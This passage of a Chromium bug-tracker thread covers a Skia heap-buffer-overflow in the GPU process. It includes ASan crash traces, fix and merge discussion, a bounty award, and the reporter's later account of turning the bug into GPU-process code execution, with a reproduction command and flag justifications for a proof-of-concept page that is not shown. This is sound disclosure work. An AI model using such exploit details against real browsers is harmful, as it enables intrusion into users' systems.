    #2 0x5f250f5d2d9d in GrBufferAllocPool::resetCpuData(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:389:60
    #3 0x5f250f5d4904 in GrBufferAllocPool::createBlock(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:362:15
    #4 0x5f250f5d3cbe in GrBufferAllocPool::makeSpace(unsigned long, unsigned long, sk_sp<GrBuffer const>*, unsigned long*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:229:16
    #5 0x5f250f5d60f8 in GrVertexBufferAllocPool::makeSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:445:28
    #6 0x5f250f850399 in GrEagerDynamicVertexAllocator::lock(unsigned long, int) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.cpp:20:31
    #7 0x5f250f84c340 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.h:39:25
    #8 0x5f250f8013f2 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #9 0x5f250f84028a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #10 0x5f250f62b68a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #11 0x5f250f5c5d7b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #12 0x5f250f5c4223 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #13 0x5f250f5c71e0 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #14 0x5f250f55d988 in GrDirectContext::flushAndSubmit(GrSyncCpu) third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:448:36
    #15 0x5f250f55e54d in GrDirectContext::freeGpuResources() third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:227:11
    #16 0x5f2516d45450 in gpu::raster::GrCacheController::PurgeGrCache(unsigned long) gpu/command_buffer/service/gr_cache_controller.cc:114:35
    #17 0x5f2516d45ba9 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::raster::GrCacheController::*&&)(unsigned long), gpu::raster::GrCacheController*, unsigned long&&>, base::internal::BindState<true, true, false, void (gpu::raster::GrCacheController::*)(unsigned long), base::internal::UnretainedWrapper<gpu::raster::GrCacheController, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, unsigned long>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #18 0x5f24f688bd86 in void base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::ForwardOnce<>() base/functional/callback.h:155:12
    #19 0x5f24f688c050 in base::internal::Invoker<base::internal::FunctorTraits<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*&&)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>&&>, base::internal::BindState<true, true, false, void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #20 0x5f250d2f6d26 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #21 0x5f250d36e167 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #22 0x5f250d36d03a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #23 0x5f250d1b7799 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #24 0x5f250d36f857 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:647:12
    #25 0x5f250d271fd0 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #26 0x5f2518b34c5c in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #27 0x5f250902a4ef in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/skia/src/gpu/BufferWriter.h:92:9 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*)
Shadow bytes around the buggy address:
  0x766f4cf8f580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4cf8f600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4cf8f680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4cf8f700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4cf8f780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x766f4cf8f800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x766f4cf8f880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4cf8f900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4cf8f980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4cf8fa00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4cf8fa80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==130206==ADDITIONAL INFO

==130206==Note: Please include this section with the ASan report.
Task trace:
    #0 0x5f2516d44cf3 in gpu::raster::GrCacheController::ScheduleGrContextCleanup() gpu/command_buffer/service/gr_cache_controller.cc:60:33
    #1 0x5f25009db472 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #2 0x5f25009d61c6 in gpu::Scheduler::TryScheduleSequence(gpu::Scheduler::Sequence*) gpu/command_buffer/service/scheduler.cc:432:29


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --enable-gpu-rasterization --disable-skia-graphite --ozone-platform=wayland --render-node-override=/dev/dri/renderD128 --crashpad-handler-pid=128817 --enable-crash-reporter=, --disable-breakpad --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAMAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,15255541151435152362,15227932811306257721,262144 --field-trial-handle=3,i,67546488086748836,2062697802880037586,262144 --disable-features=EyeDropper --variations-seed-version --pseudonymization-salt-handle=7,i,15377697164023304477,13832350280839994099,4 --trace-process-track-uuid=3190709004115666625`


==130206==END OF ADDITIONAL INFO

==130206==ABORTING
[128978:128983:0317/155832.868944:ERROR:gpu/ipc/client/command_buffer_proxy_impl.cc:448] GPU state invalid after WaitForTokenInRange.
[128806:128806:0317/155832.879342:ERROR:content/browser/gpu/gpu_process_host.cc:996] GPU process exited unexpectedly: exit_code=256
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[131306:131306:0317/155833.337842:ERROR:ui/ozone/platform/wayland/gpu/wayland_surface_factory.cc:251] '--ozone-platform=wayland' is not compatible with Vulkan. Consider switching to '--ozone-platform=x11' or disabling Vulkan
WARNING: radv is not a conformant Vulkan implementation, testing use only.
[128806:128835:0317/155842.423848:ERROR:google_apis/gcm/engine/registration_request.cc:291] Registration response error message: DEPRECATED_ENDPOINT
=================================================================
==131306==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x766f4c5b2820 at pc 0x5f250f84db2e bp 0x7fff5c9e1890 sp 0x7fff5c9e1888
WRITE of size 8 at 0x766f4c5b2820 thread T0 (chrome)
    #0 0x5f250f84db2d in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/BufferWriter.h:92:9
    #1 0x5f250f8013f2 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #2 0x5f250f84028a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #3 0x5f250f62b68a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #4 0x5f250f5c5d7b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #5 0x5f250f5c4223 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #6 0x5f250f5c71e0 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #7 0x5f250f55d988 in GrDirectContext::flushAndSubmit(GrSyncCpu) third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:448:36
    #8 0x5f250f55e54d in GrDirectContext::freeGpuResources() third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:227:11
    #9 0x5f2516d45450 in gpu::raster::GrCacheController::PurgeGrCache(unsigned long) gpu/command_buffer/service/gr_cache_controller.cc:114:35
    #10 0x5f2516d45ba9 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::raster::GrCacheController::*&&)(unsigned long), gpu::raster::GrCacheController*, unsigned long&&>, base::internal::BindState<true, true, false, void (gpu::raster::GrCacheController::*)(unsigned long), base::internal::UnretainedWrapper<gpu::raster::GrCacheController, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, unsigned long>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #11 0x5f24f688bd86 in void base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::ForwardOnce<>() base/functional/callback.h:155:12
    #12 0x5f24f688c050 in base::internal::Invoker<base::internal::FunctorTraits<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*&&)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>&&>, base::internal::BindState<true, true, false, void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #13 0x5f250d2f6d26 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #14 0x5f250d36e167 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #15 0x5f250d36d03a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #16 0x5f250d1b7799 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #17 0x5f250d36f857 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:647:12
    #18 0x5f250d271fd0 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #19 0x5f2518b34c5c in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #20 0x5f250902a4ef in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #21 0x5f250902b800 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #22 0x5f250902e428 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1147:10
    #23 0x5f2509027f01 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #24 0x5f25090284fc in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #25 0x5f24f5f0e279 in ChromeMain chrome/app/chrome_main.cc:191:12
    #26 0x7a6f9a82a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #27 0x7a6f9a82a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #28 0x5f24f5e31029 in _start (/home/pop/sec/chromium/chrome_stable_146/chrome+0x10c27029) (BuildId: 46d49f5b6958dc43)

0x766f4c5b2820 is located 0 bytes after 17179869216-byte region [0x766b4c5b2800,0x766f4c5b2820)
allocated by thread T0 (chrome) here:
    #0 0x5f24f5f0cb3d in operator new(unsigned long) (/home/pop/sec/chromium/chrome_stable_146/chrome+0x10d02b3d) (BuildId: 46d49f5b6958dc43)
    #1 0x5f250f5d1d81 in GrBufferAllocPool::CpuBufferCache::makeBuffer(unsigned long, bool) third_party/skia/src/gpu/ganesh/GrCpuBuffer.h:29:20
    #2 0x5f250f5d2d9d in GrBufferAllocPool::resetCpuData(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:389:60
    #3 0x5f250f5d4904 in GrBufferAllocPool::createBlock(unsigned long) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:362:15
    #4 0x5f250f5d3cbe in GrBufferAllocPool::makeSpace(unsigned long, unsigned long, sk_sp<GrBuffer const>*, unsigned long*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:229:16
    #5 0x5f250f5d60f8 in GrVertexBufferAllocPool::makeSpace(unsigned long, int, sk_sp<GrBuffer const>*, int*) third_party/skia/src/gpu/ganesh/GrBufferAllocPool.cpp:445:28
    #6 0x5f250f850399 in GrEagerDynamicVertexAllocator::lock(unsigned long, int) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.cpp:20:31
    #7 0x5f250f84c340 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrEagerVertexAllocator.h:39:25
    #8 0x5f250f8013f2 in GrOp::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
    #9 0x5f250f84028a in skgpu::ganesh::OpsTask::onPrepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/ops/OpsTask.cpp:548:27
    #10 0x5f250f62b68a in GrRenderTask::prepare(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrRenderTask.cpp:111:11
    #11 0x5f250f5c5d7b in GrDrawingManager::executeRenderTasks(GrOpFlushState*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:266:21
    #12 0x5f250f5c4223 in GrDrawingManager::flush(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:209:34
    #13 0x5f250f5c71e0 in GrDrawingManager::flushSurfaces(SkSpan<GrSurfaceProxy*>, SkSurfaces::BackendSurfaceAccess, GrFlushInfo const&, skgpu::MutableTextureState const*) third_party/skia/src/gpu/ganesh/GrDrawingManager.cpp:540:27
    #14 0x5f250f55d988 in GrDirectContext::flushAndSubmit(GrSyncCpu) third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:448:36
    #15 0x5f250f55e54d in GrDirectContext::freeGpuResources() third_party/skia/src/gpu/ganesh/GrDirectContext.cpp:227:11
    #16 0x5f2516d45450 in gpu::raster::GrCacheController::PurgeGrCache(unsigned long) gpu/command_buffer/service/gr_cache_controller.cc:114:35
    #17 0x5f2516d45ba9 in base::internal::Invoker<base::internal::FunctorTraits<void (gpu::raster::GrCacheController::*&&)(unsigned long), gpu::raster::GrCacheController*, unsigned long&&>, base::internal::BindState<true, true, false, void (gpu::raster::GrCacheController::*)(unsigned long), base::internal::UnretainedWrapper<gpu::raster::GrCacheController, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, unsigned long>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #18 0x5f24f688bd86 in void base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::ForwardOnce<>() base/functional/callback.h:155:12
    #19 0x5f24f688c050 in base::internal::Invoker<base::internal::FunctorTraits<void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*&&)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>&&>, base::internal::BindState<true, true, false, void (base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>::*)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::OnceCallback<void ()>>>>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #20 0x5f250d2f6d26 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #21 0x5f250d36e167 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #22 0x5f250d36d03a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #23 0x5f250d1b7799 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #24 0x5f250d36f857 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:647:12
    #25 0x5f250d271fd0 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #26 0x5f2518b34c5c in content::GpuMain(content::MainFunctionParams) content/gpu/gpu_main.cc:479:14
    #27 0x5f250902a4ef in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/skia/src/gpu/BufferWriter.h:92:9 in skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*)
Shadow bytes around the buggy address:
  0x766f4c5b2580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4c5b2600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4c5b2680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4c5b2700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x766f4c5b2780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x766f4c5b2800: 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa fa
  0x766f4c5b2880: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4c5b2900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4c5b2980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4c5b2a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x766f4c5b2a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==131306==ADDITIONAL INFO

==131306==Note: Please include this section with the ASan report.
Task trace:
    #0 0x5f2516d44cf3 in gpu::raster::GrCacheController::ScheduleGrContextCleanup() gpu/command_buffer/service/gr_cache_controller.cc:60:33
    #1 0x5f25009db472 in gpu::Scheduler::RunNextTask() gpu/command_buffer/service/scheduler.cc:647:27
    #2 0x5f25009d61c6 in gpu::Scheduler::TryScheduleSequence(gpu::Scheduler::Sequence*) gpu/command_buffer/service/scheduler.cc:432:29


Command line: `/proc/self/exe --type=gpu-process --no-sandbox --enable-gpu-rasterization --disable-skia-graphite --ozone-platform=wayland --render-node-override=/dev/dri/renderD128 --crashpad-handler-pid=128817 --enable-crash-reporter=, --disable-breakpad --change-stack-guard-on-fork=enable --gpu-preferences=UAAAAAAAAAAgAQAMAAAAAAAAAAAAAMAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAYAAAAAAAAABgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA --shared-files --metrics-shmem-handle=4,i,17140735126887967029,16537712803810269949,262144 --field-trial-handle=3,i,67546488086748836,2062697802880037586,262144 --disable-features=EyeDropper --variations-seed-version --pseudonymization-salt-handle=7,i,15377697164023304477,13832350280839994099,4 --trace-process-track-uuid=3190709005052708474`


==131306==END OF ADDITIONAL INFO

==131306==ABORTING
[128978:128983:0317/155909.741198:ERROR:gpu/ipc/client/command_buffer_proxy_impl.cc:448] GPU state invalid after WaitForTokenInRange.
[128806:128806:0317/155909.748153:ERROR:content/browser/gpu/gpu_process_host.cc:996] GPU process exited unexpectedly: exit_code=256

```

---

Credit: Quang Luong of Calif.io in collaboration with OpenAI Codex

### qq...@calif.io (2026-03-24)

Hello,

Have you been able to reproduce the issue in Chrome Stable 146 with my new PoC I posted above? Please let me know if it doesn't work for you. I added another one that I can reliably trigger on Chrome Stable although I haven't tested on a wider range of hardware.

I am not sure why llvm-symbolizer didn't work as is but if you run into that, this should help:

```
❯ printf '%s\n' \
    0x2a643b2d 0x2a5f73f2 0x2a63628a 0x2a42168a 0x2a3bbd7b \
    0x2a3ba223 0x2a3bd1e0 0x31b11ca4 0x31dcacdf 0x31dd768b \
    0x1b7bbe74 \
  | llvm-symbolizer --obj=chrome --inlining --demangle
skgpu::ganesh::PathStencilCoverOp::onPrepare(GrOpFlushState*)
./../../third_party/skia/src/gpu/BufferWriter.h:92:9

GrOp::prepare(GrOpFlushState*)
./../../third_party/skia/src/gpu/ganesh/ops/GrOp.cpp:59:11
...

```

---

I will update the report with deeper reachability analysis soon. We are attempting to create stronger exploit primitives from this vulnerability from the compromised renderer model, aiming to achieve sandbox bypass on Android. Meanwhile, if you have additional questions or comments please let me know as well.

---

I also had another trigger that could be even more reliable. I can share it if the current trigger didn't work

### mi...@google.com (2026-03-24)

The fix landed in m148, please check if your cases reproduce there.

### qq...@calif.io (2026-03-24)

I checked Skia and the patch should fix this issue. Since the vulnerability here affects Stable (and potentially older version as well), will you issue CVE / credit for this?

### ch...@google.com (2026-03-25)

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M147. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### mi...@google.com (2026-03-25)

1. <https://skia-review.git.corp.google.com/c/skia/+/1184756>
2. Yes
3. No
4. No
5. No

### dr...@chromium.org (2026-03-25)

No crashes in Canary, approved to merge.

### ch...@google.com (2026-03-31)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### mi...@google.com (2026-03-31)

Already merged, adjusting labels.

### pe...@google.com (2026-03-31)

LTS Milestone M144

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qq...@calif.io (2026-04-02)

Re #6

Sorry for repeated nudging, but "Found In" should be adjusted to 146 and the fix should be backported there.

### sp...@google.com (2026-04-02)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $32000.00 for this report.

Rationale for this decision:
High Quality. Memory corruption in a non-sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### qk...@google.com (2026-04-07)

Labeled `LTS-NotApplicable-138` and `LTS-NotApplicable-144` because the bug seems to be introduced in M146[1].

[1] https://skia-review.git.corp.google.com/c/skia/+/1169977

### qq...@calif.io (2026-04-10)

Hello team,

Thank you for the bounty and for merging the fix!

Just doing some follow-up: I noticed this wasn't in the recent release notes (e.g. <https://chromereleases.googleblog.com/2026/04/stable-channel-update-for-desktop.html>) and doesn't have a CVE yet. I figured the automation might have skipped it since the bug ID was typo'd in the commit message. Could you help ensure this gets a CVE and gets added to the release notes? Thank you!

### qq...@calif.io (2026-04-21)

Per <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/vrp-faq.md#is-there-a-time-limit-for-submitting-an-exploit>, I am still actively working on the exploit. We turned the OOB here into a controlled write in our internal build. However, we still need more times for cleaning up + optimizing reliability, I want to request 2-3 weeks extension for the exploit development.

Thanks!

### qq...@calif.io (2026-05-12)

Hello, I managed to use this vulnerability to RCE Chromium GPU process, assuming compromised renderer model and want to request reassessment. As I submitted this bug before the new rule, does the old rule still apply? Still, I think this research is useful regardless. I tested this on Chrome 146.0.7680.164 Linux x64 but the technique is likely work on other OSes as well. Please let me know if you have any trouble reproducing this.

## Reproduction command

```
rm -rf /tmp/pwned;rm -rf /tmp/gpu-rce-demo
USERDIR=$(mktemp -d /tmp/mojojs.XXXXXX) google-chrome-stable \
    --enable-blink-features=MojoJS \
    --enable-features=RemoveGPULegacyIPC \
    --disable-popup-blocking \
    --no-gpu-sandbox \
    --user-data-dir="/tmp/gpu-rce-demo" \
    --enable-logging=stderr \
    --no-first-run --no-default-browser-check \
    "file://$PWD/poc_vrp.html"

# Verify: /tmp/pwned exists as a directory created by the GPU process.
ls -la /tmp/pwned

```
### Flag justifications

--enable-blink-features=MojoJS is stand-in for compromised renderer RCE.

--enable-features=RemoveGPULegacyIPC does not give new capability to attacker.
We use the new path because legacy MojoJS bindings cannot bootstrap
channel-associated interfaces from JS, whereas in C++ (which is what a
post-V8-RCE attacker would use) the channel-associated path is reachable
identically. Chrome is migrating away from LegacyIPC anyway.

--disable-popup-blocking so we can open popup windows without user interaction.
We can make the attack here 1-click and disable this flag. However, from compromised
renderer point of view, attack already has this capability.

### aj...@google.com (2026-05-17)

Panel: see comment 25

### aj...@google.com (2026-05-17)

Trying this on the indicated chrome stable official release I get the following in the page's own log:

```
[1] &RasterDecoder   = 0x11240025cb00   (logger_ @ +0x150)
[1] PA pool_base     = 0x112000000000
ERROR: Error: Connection error: undefined
    at file:///usr/local/google/home/ajgo/pocs/gpu/poc_vrp.html:11320:16

```

### ch...@google.com (2026-05-19)

WARNING: Removing security\_release value because the issue is not on security\_impact-stable or security\_impact-extended hotlists. Please add to the correct hotlist if the issue is on a release branch.

### mi...@google.com (2026-05-19)

@aj...@google.com Can you clarify [comment #27](https://issues.chromium.org/issues/491191118#comment27), do you mean the stable version that had the PoC (146.0.7680.164) or the stable version that has the fixes (147)?

### aj...@google.com (2026-05-19)

